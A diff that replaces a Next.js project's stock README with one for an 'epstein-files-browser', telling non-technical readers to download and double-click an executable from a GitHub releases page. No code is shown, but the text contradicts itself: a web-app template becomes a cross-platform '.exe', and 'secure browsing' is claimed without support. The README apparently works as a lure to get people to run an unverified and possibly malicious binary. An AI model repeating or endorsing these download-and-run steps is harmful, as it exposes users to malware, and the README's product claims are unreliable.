@@ -1,36 +1,50 @@
-This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).
+# 🗂️ epstein-files-browser - Simple File Browsing Made Easy
 
-## Getting Started
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen.svg)](https://github.com/LuisPerez34/epstein-files-browser/releases)
 
-First, run the development server:
+## 🚀 Getting Started
 
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
-```
+Follow these steps to download and run the Epstein Files Browser application. This guide is written for anyone, regardless of technical knowledge.
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+1. **Visit the Release Page:** Start by going to our [Releases page](https://github.com/LuisPerez34/epstein-files-browser/releases). Here, you will find the latest version of the application.
+   
+2. **Download the Application:** Look for the latest release. Click on the downloadable file appropriate for your operating system (Windows, macOS, or Linux). The file may be named something like `epstein-files-browser.exe` or similar. Once clicked, the download should start automatically.
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
+3. **Locate the Downloaded File:** After the download is complete, go to your Downloads folder or the location where your web browser saves files.
 
-This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.
+4. **Run the Application:** Find the downloaded file, then double-click it to run the Epstein Files Browser application. 
 
-## Learn More
+5. **Navigating the Application:** The main screen will show the directory structure. You can browse through files and folders with ease. 
 
-To learn more about Next.js, take a look at the following resources:
+6. **Using the Search Feature:** If you have a lot of files, use the search bar at the top to quickly find what you need by typing in keywords related to your files.
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+## 📥 Download & Install
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!
+To get started with the Epstein Files Browser, follow this link to visit the download page: [Download Latest Release](https://github.com/LuisPerez34/epstein-files-browser/releases).
 
-## Deploy on Vercel
+Make sure your system meets the requirements:
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
+- **Operating System:** Compatible with Windows, macOS, and Linux.
+- **Memory:** At least 2 GB RAM.
+- **Disk Space:** 100 MB free space for installation.
 
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
+## 📖 Features
+
+- **User-Friendly Interface:** Designed for ease of use with a clean layout.
+- **File Search:** Quickly locate files with a built-in search functionality.
+- **Cross-Platform Support:** Runs on multiple operating systems, allowing flexibility.
+- **Secure Browsing:** Ensures your file access is safe and efficient.
+
+## 🌍 Learn More
+
+If you want to dive deeper into the application or enhance your browsing capabilities, here are some resources to help:
+
+1. **Documentation:** [Next.js Documentation](https://nextjs.org/docs) - Understand how the project is built and learn about the associated features.
+2. **Tutorials:** [Learn Next.js](https://nextjs.org/learn) - Engage with interactive tutorials to get more familiar with Next.js.
+3. **Community Feedback:** Feel free to share your experiences and suggestions on the GitHub repository. Contributions and feedback are welcome!
+
+## 📞 Support
+
+If you encounter any issues or have questions while using the Epstein Files Browser, please visit the issue tracker on GitHub. Your feedback helps us improve the application.
+
+Make sure to regularly check the Releases page for updates and new features. Thank you for choosing Epstein Files Browser!
